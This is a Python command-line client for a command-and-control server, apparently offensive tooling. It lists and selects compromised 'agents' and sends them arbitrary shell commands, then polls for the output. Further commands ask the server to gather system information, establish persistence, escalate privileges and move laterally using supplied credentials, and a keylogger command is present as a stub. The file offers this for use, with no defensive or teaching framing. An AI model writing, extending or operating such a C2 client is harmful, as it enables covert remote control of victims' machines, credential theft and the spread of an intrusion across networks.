######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

from datetime import datetime
import requests
import typer
import os
import time

app = typer.Typer()

C2_SERVER_URL = "http://c2_server_ip_or_url:8080"  # Replace with your server's IP/hostname
SELECTED_AGENT_FILE = "selected_agent.txt"

def save_selected_agent(agent_id: str):
    """Save the selected agent's ID to a local file."""
    with open(SELECTED_AGENT_FILE, "w") as f:
        f.write(agent_id)

def load_selected_agent():
    """Load the currently selected agent's ID from a local file."""
    if os.path.exists(SELECTED_AGENT_FILE):
        with open(SELECTED_AGENT_FILE, "r") as f:
            return f.read().strip()
    return None

@app.command()
def list_agents():
    """List all online agents."""
    try:
        response = requests.get(f"{C2_SERVER_URL}/agents")
        if response.status_code == 200:
            agents = response.json().get("agents", [])
            if agents:
                print("List of online agents:")
                for agent in agents:
                    print(f"- {agent['AgentID']}")
            else:
                print("No agents found.")
        else:
            print(f"Failed to list agents: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while listing agents: {e}")

@app.command()
def select_agent(agent_id: str):
    """Select an active agent."""
    try:
        response = requests.get(f"{C2_SERVER_URL}/agents")
        if response.status_code == 200:
            agents = response.json().get("agents", [])
            for agent in agents:
                if agent["AgentID"] == agent_id:
                    save_selected_agent(agent_id)
                    print(f"Agent {agent_id} selected.")
                    return
            print(f"Agent {agent_id} not found.")
        else:
            print(f"Failed to retrieve agents: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while selecting an agent: {e}")

@app.command()
def send_command(command: str):
    """Send a command to the selected agent and fetch the result."""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    # Step 1: Send the command to the server
    payload = {"AgentID": agent_id, "Command": command}
    try:
        print(f"Sending payload: {payload}")
        response = requests.post(f"{C2_SERVER_URL}/send_command", json=payload)
        if response.status_code == 200:
            print(f"Command sent to agent {agent_id}: {command}")
        else:
            print(f"Failed to send command: {response.status_code} {response.text}")
            return
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending the command: {e}")
        return

    # Step 2: Poll for the result
    print("Fetching command result...")
    for _ in range(10):  # Poll up to 10 times
        try:
            result_response = requests.get(f"{C2_SERVER_URL}/result", params={"agent_id": agent_id})
            if result_response.status_code == 200:
                result = result_response.json().get("Result", "No result available")
                if result != "No result available":
                    print(f"Command result from agent {agent_id}: {result}")
                    return
            else:
                print(f"Failed to fetch result: {result_response.status_code} {result_response.text}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred while fetching the result: {e}")
        time.sleep(5)  # Wait 5 seconds before trying again

    print("No result available after multiple attempts.")

@app.command()
def get_result():
    """Get the result of the last command sent to the selected agent."""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    try:
        response = requests.get(f"{C2_SERVER_URL}/result", params={"agent_id": agent_id})
        if response.status_code == 200:
            result = response.json().get("Result", "No result available")
            print(f"Command result: {result}")
        else:
            print(f"Failed to get result: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while fetching the result: {e}")

@app.command()
def gather_system_info():
    """Gather system information from the selected agent."""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    try:
        response = requests.post(f"{C2_SERVER_URL}/gather_system_info", json={"agent_id": agent_id})
        if response.status_code == 200:
            system_info = response.json().get("SystemInfo", {})
            print(f"System information for agent {agent_id}: {system_info}")
        else:
            print(f"Failed to gather system information: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while gathering system information: {e}")

@app.command()
def establish_persistence():
    """Attempt to establish persistence on the selected agent."""
    try:
        response = requests.post(f"{C2_SERVER_URL}/establish_persistence")
        if response.status_code == 200:
            print("Persistence mechanism established successfully.")
        else:
            print(f"Failed to establish persistence: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while establishing persistence: {e}")

@app.command()
def escalate_privileges():
    """Attempt to escalate privileges on the selected agent."""
    try:
        response = requests.post(f"{C2_SERVER_URL}/escalate_privileges")
        if response.status_code == 200:
            print("Privilege escalation attempted successfully.")
        else:
            print(f"Failed to escalate privileges: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while escalating privileges: {e}")

@app.command()
def start_keylogger():
    """Start a keylogger on the selected agent."""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    print(f"Starting keylogger on agent {agent_id}")
    # Placeholder for implementation

@app.command()
def move_laterally(target_ip: str, username: str, password: str):
    """Attempt lateral movement using provided credentials."""
    try:
        payload = {"target_ip": target_ip, "username": username, "password": password}
        response = requests.post(f"{C2_SERVER_URL}/move_laterally", json=payload)
        if response.status_code == 200:
            print(f"Lateral movement executed successfully: {response.json().get('Result')}")
        else:
            print(f"Failed to execute lateral movement: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred during lateral movement: {e}")

if __name__ == "__main__":
    app()
